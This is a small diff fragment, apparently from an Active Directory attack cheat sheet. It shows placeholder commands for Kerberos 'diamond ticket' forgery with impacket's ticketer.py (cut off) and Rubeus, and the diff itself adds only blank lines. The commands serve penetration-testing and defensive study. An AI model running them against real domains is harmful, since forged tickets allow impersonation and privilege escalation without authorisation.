@@ -16,3 +16,5 @@ ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password
 
 Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
 ```
+
+
